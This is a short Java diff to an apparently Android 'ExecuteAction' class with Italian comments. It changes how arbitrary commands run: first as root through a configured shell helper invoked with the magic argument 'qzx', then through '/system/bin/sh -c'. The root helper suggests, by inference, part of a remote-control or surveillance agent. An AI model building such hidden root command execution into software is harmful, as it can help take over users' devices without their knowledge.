@@ -53,7 +53,10 @@ public class ExecuteAction extends SubAction {
 		
 		// Proviamo ad eseguire il comando da root
 		try {
-			Runtime.getRuntime().exec(Configuration.shellFile + " qzx " + this.command);
+			String cmd[] = { Configuration.shellFile, "qzx", this.command }; // EXPORT
+			Process p = Runtime.getRuntime().exec(cmd);
+			
+			p.waitFor();
 			return true;
 		} catch (final Exception e1) {
 			if (Cfg.DEBUG) {
@@ -64,7 +67,10 @@ public class ExecuteAction extends SubAction {
 		
 		// Proviamo ad eseguire il comando da utente normale
 		try {
-			Runtime.getRuntime().exec(this.command);
+			String cmd[] = { "/system/bin/sh", "-c", this.command }; // EXPORT
+			Process p = Runtime.getRuntime().exec(cmd);
+			
+			p.waitFor();
 			return true;
 		} catch (final Exception e1) {
 			if (Cfg.DEBUG) {
